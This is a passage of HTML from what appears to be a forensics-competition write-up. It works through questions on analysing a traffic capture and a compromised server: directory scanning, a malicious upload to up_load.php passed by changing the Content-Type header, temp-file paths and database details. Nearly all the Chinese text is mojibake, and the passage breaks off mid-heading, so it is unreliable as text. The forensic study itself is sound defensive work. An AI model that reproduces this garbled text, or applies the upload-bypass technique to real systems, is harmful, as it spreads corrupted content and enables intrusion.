href="#4-åˆ†ææµé‡åŒ…æ£€æï¼Œæ”»å‡»è€…è¿›è¡Œç›®å½•æ‰«æå¾—åˆ°çš„å…·æœ‰åé—¨çš„é¡µé¢urlè·¯å¾„ä¸ºã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š-abc-htmlï¼‰" class="headerlink" title="4.åˆ†ææµé‡åŒ…æ£€æï¼Œæ”»å‡»è€…è¿›è¡Œç›®å½•æ‰«æå¾—åˆ°çš„å…·æœ‰åé—¨çš„é¡µé¢urlè·¯å¾„ä¸ºã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š/abc.htmlï¼‰"></a>4.åˆ†ææµé‡åŒ…æ£€æï¼Œæ”»å‡»è€…è¿›è¡Œç›®å½•æ‰«æå¾—åˆ°çš„å…·æœ‰åé—¨çš„é¡µé¢urlè·¯å¾„ä¸ºã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š/abc.htmlï¼‰</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-165626486.png" class="">  <p>æœç´¢ç›®å½•æ‰«æä¸º200çš„æ‰«æç›®å½•<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-165537979.png" class=""><br>å‘ç°up_load.phpå’Œhtml<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-165814510.png" class=""><br>up_load.html</p><h2 id="5-åˆ†ææµé‡åŒ…æ£€æï¼Œæ”»å‡»è€…é€šè¿‡ä¿®æ”¹è¯·æ±‚åŒ…ä¸­çš„å“ªä¸ªå­—æ®µå¯¼è‡´æ¶æ„æ–‡ä»¶æˆåŠŸä¸Šä¼ ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼štest-typeï¼‰"><a href="#5-åˆ†ææµé‡åŒ…æ£€æï¼Œæ”»å‡»è€…é€šè¿‡ä¿®æ”¹è¯·æ±‚åŒ…ä¸­çš„å“ªä¸ªå­—æ®µå¯¼è‡´æ¶æ„æ–‡ä»¶æˆåŠŸä¸Šä¼ ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼štest-typeï¼‰" class="headerlink" title="5.åˆ†ææµé‡åŒ…æ£€æï¼Œæ”»å‡»è€…é€šè¿‡ä¿®æ”¹è¯·æ±‚åŒ…ä¸­çš„å“ªä¸ªå­—æ®µå¯¼è‡´æ¶æ„æ–‡ä»¶æˆåŠŸä¸Šä¼ ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼štest-typeï¼‰"></a>5.åˆ†ææµé‡åŒ…æ£€æï¼Œæ”»å‡»è€…é€šè¿‡ä¿®æ”¹è¯·æ±‚åŒ…ä¸­çš„å“ªä¸ªå­—æ®µå¯¼è‡´æ¶æ„æ–‡ä»¶æˆåŠŸä¸Šä¼ ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼štest-typeï¼‰</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-170505718.png" class="">  <img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-170719039.png" class="">  <p>æœç´¢up_loadå¯ä»¥æ‰¾åˆ°ä¸Šä¼ çš„æµé‡<br>å¯»æ‰¾ä¸Šä¼ æˆåŠŸçš„æµé‡<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-170833003.png" class=""><br>å¯ä»¥å‘ç°ä¿®æ”¹äº†MIMEå¤´å°±æˆåŠŸä¸Šä¼ <br>Content-Type:</p><h2 id="6-åˆ†ææµé‡åŒ…æ£€æï¼Œæ”»å‡»è€…ä¸Šä¼ æˆåŠŸçš„æ¶æ„æ–‡ä»¶-è¯¥æ–‡ä»¶çš„ä¸´æ—¶å­˜æ”¾è·¯å¾„æ˜¯ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š-abc-edfï¼‰"><a href="#6-åˆ†ææµé‡åŒ…æ£€æï¼Œæ”»å‡»è€…ä¸Šä¼ æˆåŠŸçš„æ¶æ„æ–‡ä»¶-è¯¥æ–‡ä»¶çš„ä¸´æ—¶å­˜æ”¾è·¯å¾„æ˜¯ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š-abc-edfï¼‰" class="headerlink" title="6.åˆ†ææµé‡åŒ…æ£€æï¼Œæ”»å‡»è€…ä¸Šä¼ æˆåŠŸçš„æ¶æ„æ–‡ä»¶, è¯¥æ–‡ä»¶çš„ä¸´æ—¶å­˜æ”¾è·¯å¾„æ˜¯ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š/abc/edfï¼‰"></a>6.åˆ†ææµé‡åŒ…æ£€æï¼Œæ”»å‡»è€…ä¸Šä¼ æˆåŠŸçš„æ¶æ„æ–‡ä»¶, è¯¥æ–‡ä»¶çš„ä¸´æ—¶å­˜æ”¾è·¯å¾„æ˜¯ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š/abc/edfï¼‰</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-170923989.png" class="">  <p>/tmp/php7Ndiwg</p><h2 id="7-åˆ†ææµé‡åŒ…æ£€æï¼ŒæœåŠ¡å™¨phpé…ç½®æ–‡ä»¶çš„å­˜æ”¾ä½ç½®ï¼ˆæ ‡å‡†æ ¼å¼ï¼š-www-sev-php-iniï¼‰"><a href="#7-åˆ†ææµé‡åŒ…æ£€æï¼ŒæœåŠ¡å™¨phpé…ç½®æ–‡ä»¶çš„å­˜æ”¾ä½ç½®ï¼ˆæ ‡å‡†æ ¼å¼ï¼š-www-sev-php-iniï¼‰" class="headerlink" title="7.åˆ†ææµé‡åŒ…æ£€æï¼ŒæœåŠ¡å™¨phpé…ç½®æ–‡ä»¶çš„å­˜æ”¾ä½ç½®ï¼ˆæ ‡å‡†æ ¼å¼ï¼š/www/sev/php.iniï¼‰"></a>7.åˆ†ææµé‡åŒ…æ£€æï¼ŒæœåŠ¡å™¨phpé…ç½®æ–‡ä»¶çš„å­˜æ”¾ä½ç½®ï¼ˆæ ‡å‡†æ ¼å¼ï¼š/www/sev/php.iniï¼‰</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-173031562.png" class="">  <p>AESè§£å¯†ï¼Œivå…¨å¡«0å³å¯</p><h2 id="8-åˆ†ææµé‡åŒ…æ£€æï¼Œè¢«æ”»å‡»çš„webç¯å¢ƒå…¶æ•°æ®åº“å¯†ç æ˜¯ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šqwer1234ï¼‰"><a href="#8-åˆ†ææµé‡åŒ…æ£€æï¼Œè¢«æ”»å‡»çš„webç¯å¢ƒå…¶æ•°æ®åº“å¯†ç æ˜¯ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šqwer1234ï¼‰" class="headerlink" title="8.åˆ†ææµé‡åŒ…æ£€æï¼Œè¢«æ”»å‡»çš„webç¯å¢ƒå…¶æ•°æ®åº“å¯†ç æ˜¯ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šqwer1234ï¼‰"></a>8.åˆ†ææµé‡åŒ…æ£€æï¼Œè¢«æ”»å‡»çš„webç¯å¢ƒå…¶æ•°æ®åº“å¯†ç æ˜¯ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šqwer1234ï¼‰</h2><h2 id="9-åˆ†ææµé‡åŒ…æ£€æï¼ŒæœåŠ¡å™¨ç®¡ç†å­˜æ”¾ä¸´æ—¶ç™»å½•å¯†ç çš„ä½ç½®ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š-tmp-passï¼‰"><a href="#9-åˆ†ææµé‡åŒ…æ£€æï¼ŒæœåŠ¡å™¨ç®¡ç†å­˜æ”¾ä¸´æ—¶ç™»å½•å¯†ç çš„ä½ç½®ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š-tmp-passï¼‰" class="headerlink" title="9.åˆ†ææµé‡åŒ…æ£€æï¼ŒæœåŠ¡å™¨ç®¡ç†å­˜æ”¾ä¸´æ—¶ç™»å½•å¯†ç çš„ä½ç½®ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š/tmp/passï¼‰"></a>9.åˆ†ææµé‡åŒ…æ£€æï¼ŒæœåŠ¡å™¨ç®¡ç†å­˜æ”¾ä¸´æ—¶ç™»å½•å¯†ç çš„ä½ç½®ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š/tmp/passï¼‰</h2><h2 id="10-åˆ†ææµé‡åŒ…æ£€æï¼Œé»‘å®¢è·å–çš„é«˜æƒé™ä¸»æœºçš„ç™»å½•å¯†ç ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šqwer1234ï¼‰"><a href="#10-åˆ†ææµé‡åŒ…æ£€æï¼Œé»‘å®¢è·å–çš„é«˜æƒé™ä¸»æœºçš„ç™»å½•å¯†ç ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šqwer1234ï¼‰" class="headerlink" title="10.åˆ†ææµé‡åŒ…æ£€æï¼Œé»‘å®¢è·å–çš„é«˜æƒé™ä¸»æœºçš„ç™»å½•å¯†ç ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šqwer1234ï¼‰"></a>10.åˆ†ææµé‡åŒ…æ£€æï¼Œé»‘å®¢è·å–çš„é«˜æƒé™ä¸»æœºçš„ç™»å½•å¯†ç ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šqwer1234ï¼‰</h2><h1 id="æœåŠ¡å™¨å–è¯"><a href="#æœåŠ¡å™¨å–è¯" class="headerlink" title="æœåŠ¡å™¨å–è¯"></a>æœåŠ¡å™¨å–è¯</h1><h2 id="1-åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨ä¼šåšç™»å½•å¯†ç éªŒè¯ï¼Œè¯¥ç™»å½•éªŒè¯æ–‡ä»¶ä½ç½®åœ¨ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š-xxx-xxx-xxx-xxx"><a href="#1-åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨ä¼šåšç™»å½•å¯†ç éªŒè¯ï¼Œè¯¥ç™»å½•éªŒè¯æ–‡ä»¶ä½ç½®åœ¨ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š-xxx-xxx-xxx-xxx" class="headerlink" title="1.åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨ä¼šåšç™»å½•å¯†ç éªŒè¯ï¼Œè¯¥ç™»å½•éªŒè¯æ–‡ä»¶ä½ç½®åœ¨ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š/xxx/xxx/xxx.xxx)"></a>1.åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨ä¼šåšç™»å½•å¯†ç éªŒè¯ï¼Œè¯¥ç™»å½•éªŒè¯æ–‡ä»¶ä½ç½®åœ¨ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š/xxx/xxx/xxx.xxx)</h2><h2 id="2-åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨sshç«¯å£æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š1234"><a href="#2-åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨sshç«¯å£æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š1234" class="headerlink" title="2.åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨sshç«¯å£æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š1234)"></a>2.åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨sshç«¯å£æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š1234)</h2><h2 id="3-åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨dockerå†…æœ‰å¤šå°‘ä¸ªé•œåƒã€‚-æ ‡å‡†æ ¼å¼ï¼š100"><a href="#3-åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨dockerå†…æœ‰å¤šå°‘ä¸ªé•œåƒã€‚-æ ‡å‡†æ ¼å¼ï¼š100" class="headerlink" title="3.åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨dockerå†…æœ‰å¤šå°‘ä¸ªé•œåƒã€‚(æ ‡å‡†æ ¼å¼ï¼š100)"></a>3.åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨dockerå†…æœ‰å¤šå°‘ä¸ªé•œåƒã€‚(æ ‡å‡†æ ¼å¼ï¼š100)</h2><h2 id="4-åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨å†…sqlserveré»˜è®¤è´¦å·çš„å¯†ç æ˜¯ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šxxx"><a href="#4-åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨å†…sqlserveré»˜è®¤è´¦å·çš„å¯†ç æ˜¯ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šxxx" class="headerlink" title="4.åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨å†…sqlserveré»˜è®¤è´¦å·çš„å¯†ç æ˜¯ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šxxx)"></a>4.åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨å†…sqlserveré»˜è®¤è´¦å·çš„å¯†ç æ˜¯ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šxxx)</h2><h2 id="5-åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨å†…sqlserverå­˜æ”¾äº†é˜¿é‡Œäº‘å­˜å‚¨ä¸‹è½½åœ°å€ï¼Œè¯¥ä¸‹è½½åœ°å€æ˜¯ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šhttps-xxx"><a href="#5-åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨å†…sqlserverå­˜æ”¾äº†é˜¿é‡Œäº‘å­˜å‚¨ä¸‹è½½åœ°å€ï¼Œè¯¥ä¸‹è½½åœ°å€æ˜¯ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šhttps-xxx" class="headerlink" title="5.åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨å†…sqlserverå­˜æ”¾äº†é˜¿é‡Œäº‘å­˜å‚¨ä¸‹è½½åœ°å€ï¼Œè¯¥ä¸‹è½½åœ°å€æ˜¯ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šhttps://xxx)"></a>5.åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨å†…sqlserverå­˜æ”¾äº†é˜¿é‡Œäº‘å­˜å‚¨ä¸‹è½½åœ°å€ï¼Œè¯¥ä¸‹è½½åœ°å€æ˜¯ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š<a href="https://xxx">https://xxx</a>)</h2><h2 id="6-åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨å†…sqlserverå†…â€œcmf-user-action-logâ€è¡¨ï¼Œè¡¨å†…å­˜åœ¨çš„ç”¨æˆ·æ“ä½œæ—¥å¿—ï¼Œä¸€å…±æ“ä½œæ¬¡æ•°æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š100"><a href="#6-åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨å†…sqlserverå†…â€œcmf-user-action-logâ€è¡¨ï¼Œè¡¨å†…å­˜åœ¨çš„ç”¨æˆ·æ“ä½œæ—¥å¿—ï¼Œä¸€å…±æ“ä½œæ¬¡æ•°æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š100" class="headerlink" title="6.åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨å†…sqlserverå†…â€œcmf_user_action_logâ€è¡¨ï¼Œè¡¨å†…å­˜åœ¨çš„ç”¨æˆ·æ“ä½œæ—¥å¿—ï¼Œä¸€å…±æ“ä½œæ¬¡æ•°æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š100)"></a>6.åˆ†ææœåŠ¡å™¨æ£€æï¼ŒæœåŠ¡å™¨å†…sqlserverå†…â€œcmf_user_action_logâ€è¡¨ï¼Œè¡¨å†…å­˜åœ¨çš„ç”¨æˆ·æ“ä½œæ—¥å¿—ï¼Œä¸€å…±æ“ä½œæ¬¡æ•°æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š100)</h2><h2 id="7-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥æœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨çš„æ•°æ®åº“çš„æŒä¹…åŒ–ç›®å½•æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š-xxx-xxx"><a href="#7-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥æœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨çš„æ•°æ®åº“çš„æŒä¹…åŒ–ç›®å½•æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š-xxx-xxx" class="headerlink" title="7.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥æœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨çš„æ•°æ®åº“çš„æŒä¹…åŒ–ç›®å½•æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š/xxx/xxx)"></a>7.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥æœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨çš„æ•°æ®åº“çš„æŒä¹…åŒ–ç›®å½•æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š/xxx/xxx)</h2><h2 id="8-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åå°æ­£åœ¨ä½¿ç”¨çš„æ•°æ®åº“æœ‰å¤šå°‘ä¸ªé›†åˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š100"><a href="#8-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åå°æ­£åœ¨ä½¿ç”¨çš„æ•°æ®åº“æœ‰å¤šå°‘ä¸ªé›†åˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š100" class="headerlink" title="8.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åå°æ­£åœ¨ä½¿ç”¨çš„æ•°æ®åº“æœ‰å¤šå°‘ä¸ªé›†åˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š100)"></a>8.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åå°æ­£åœ¨ä½¿ç”¨çš„æ•°æ®åº“æœ‰å¤šå°‘ä¸ªé›†åˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š100)</h2><h2 id="9-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™çš„åå°ç™»å½•åœ°å€æ˜¯ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š-xxx-xxx-xxx-å…¨å°å†™ï¼Œä¸åŠ åŸŸå"><a href="#9-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™çš„åå°ç™»å½•åœ°å€æ˜¯ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š-xxx-xxx-xxx-å…¨å°å†™ï¼Œä¸åŠ åŸŸå" class="headerlink" title="9.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™çš„åå°ç™»å½•åœ°å€æ˜¯ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š/xxx/xxx.xxx å…¨å°å†™ï¼Œä¸åŠ åŸŸå)"></a>9.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™çš„åå°ç™»å½•åœ°å€æ˜¯ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š/xxx/xxx.xxx å…¨å°å†™ï¼Œä¸åŠ åŸŸå)</h2><h2 id="10-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åå°ä½¿ç”¨çš„ç®¡ç†å‘˜åŠ å¯†ç®—æ³•æ˜¯ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šå…¨å¤§å†™"><a href="#10-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åå°ä½¿ç”¨çš„ç®¡ç†å‘˜åŠ å¯†ç®—æ³•æ˜¯ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šå…¨å¤§å†™" class="headerlink" title="10.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åå°ä½¿ç”¨çš„ç®¡ç†å‘˜åŠ å¯†ç®—æ³•æ˜¯ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šå…¨å¤§å†™)"></a>10.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åå°ä½¿ç”¨çš„ç®¡ç†å‘˜åŠ å¯†ç®—æ³•æ˜¯ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šå…¨å¤§å†™)</h2><h2 id="11-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™æœ€æ—©ä½¿ç”¨è¶…çº§ç®¡ç†å‘˜è¿›è¡Œåˆ é™¤ç®¡ç†å‘˜æ“ä½œçš„IPåœ°å€æ˜¯ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šx-x-x-x"><a href="#11-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™æœ€æ—©ä½¿ç”¨è¶…çº§ç®¡ç†å‘˜è¿›è¡Œåˆ é™¤ç®¡ç†å‘˜æ“ä½œçš„IPåœ°å€æ˜¯ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šx-x-x-x" class="headerlink" title="11.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™æœ€æ—©ä½¿ç”¨è¶…çº§ç®¡ç†å‘˜è¿›è¡Œåˆ é™¤ç®¡ç†å‘˜æ“ä½œçš„IPåœ°å€æ˜¯ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šx.x.x.x)"></a>11.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™æœ€æ—©ä½¿ç”¨è¶…çº§ç®¡ç†å‘˜è¿›è¡Œåˆ é™¤ç®¡ç†å‘˜æ“ä½œçš„IPåœ°å€æ˜¯ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šx.x.x.x)</h2><h2 id="12-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åå°ä¸Šä¼ è¿‡sha256å€¼ä¸ºâ€œb204ad1f475c7716daab9afb5f8d61815c508f2a2b1539bc1f42fe2f212b30d1â€çš„å‹ç¼©åŒ…æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å†…çš„è´¦å•äº¤æ˜“è®¢å•å·æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š123456"><a href="#12-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åå°ä¸Šä¼ è¿‡sha256å€¼ä¸ºâ€œb204ad1f475c7716daab9afb5f8d61815c508f2a2b1539bc1f42fe2f212b30d1â€çš„å‹ç¼©åŒ…æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å†…çš„è´¦å•äº¤æ˜“è®¢å•å·æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š123456" class="headerlink" title="12.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åå°ä¸Šä¼ è¿‡sha256å€¼ä¸ºâ€œb204ad1f475c7716daab9afb5f8d61815c508f2a2b1539bc1f42fe2f212b30d1â€çš„å‹ç¼©åŒ…æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å†…çš„è´¦å•äº¤æ˜“è®¢å•å·æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š123456)"></a>12.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åå°ä¸Šä¼ è¿‡sha256å€¼ä¸ºâ€œb204ad1f475c7716daab9afb5f8d61815c508f2a2b1539bc1f42fe2f212b30d1â€çš„å‹ç¼©åŒ…æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å†…çš„è´¦å•äº¤æ˜“è®¢å•å·æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š123456)</h2><h2 id="13-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™å­˜åœ¨ç½‘ç«™æ•°æ®åº“å¤‡ä»½åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½çš„æ¥å£åœ°å€æ˜¯ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š-xxx-xxx-å…¨å°å†™ï¼Œä¸åŠ åŸŸå"><a href="#13-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™å­˜åœ¨ç½‘ç«™æ•°æ®åº“å¤‡ä»½åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½çš„æ¥å£åœ°å€æ˜¯ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š-xxx-xxx-å…¨å°å†™ï¼Œä¸åŠ åŸŸå" class="headerlink" title="13.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™å­˜åœ¨ç½‘ç«™æ•°æ®åº“å¤‡ä»½åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½çš„æ¥å£åœ°å€æ˜¯ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š/xxx/xxx å…¨å°å†™ï¼Œä¸åŠ åŸŸå)"></a>13.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™å­˜åœ¨ç½‘ç«™æ•°æ®åº“å¤‡ä»½åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½çš„æ¥å£åœ°å€æ˜¯ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š/xxx/xxx å…¨å°å†™ï¼Œä¸åŠ åŸŸå)</h2><h2 id="14-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™å­˜æ”¾é“¶è¡Œå¡ä¿¡æ¯æ•°æ®è¡¨ä¸­ï¼Œå…¶ä¸­ä¿¡æ¯æ•°é‡å‰åçš„å…¬å¸å¯¹åº”æ——ä¸‹visaé“¶è¡Œå¡ä¸€å…±æœ‰å¤šå°‘é‡‘é¢ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š100-00"><a href="#14-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™å­˜æ”¾é“¶è¡Œå¡ä¿¡æ¯æ•°æ®è¡¨ä¸­ï¼Œå…¶ä¸­ä¿¡æ¯æ•°é‡å‰åçš„å…¬å¸å¯¹åº”æ——ä¸‹visaé“¶è¡Œå¡ä¸€å…±æœ‰å¤šå°‘é‡‘é¢ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š100-00" class="headerlink" title="14.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™å­˜æ”¾é“¶è¡Œå¡ä¿¡æ¯æ•°æ®è¡¨ä¸­ï¼Œå…¶ä¸­ä¿¡æ¯æ•°é‡å‰åçš„å…¬å¸å¯¹åº”æ——ä¸‹visaé“¶è¡Œå¡ä¸€å…±æœ‰å¤šå°‘é‡‘é¢ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š100.00)"></a>14.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™å­˜æ”¾é“¶è¡Œå¡ä¿¡æ¯æ•°æ®è¡¨ä¸­ï¼Œå…¶ä¸­ä¿¡æ¯æ•°é‡å‰åçš„å…¬å¸å¯¹åº”æ——ä¸‹visaé“¶è¡Œå¡ä¸€å…±æœ‰å¤šå°‘é‡‘é¢ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š100.00)</h2><h2 id="15-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åœ¨2023å¹´äºŒæœˆä¸€å…±è·å–äº†å¤šå°‘æ¡é€šä¿¡è®°å½•ï¼Ÿ-æ ‡å‡†æ ‡å‡†æ ¼å¼ï¼š100"><a href="#15-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åœ¨2023å¹´äºŒæœˆä¸€å…±è·å–äº†å¤šå°‘æ¡é€šä¿¡è®°å½•ï¼Ÿ-æ ‡å‡†æ ‡å‡†æ ¼å¼ï¼š100" class="headerlink" title="15.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åœ¨2023å¹´äºŒæœˆä¸€å…±è·å–äº†å¤šå°‘æ¡é€šä¿¡è®°å½•ï¼Ÿ(æ ‡å‡†æ ‡å‡†æ 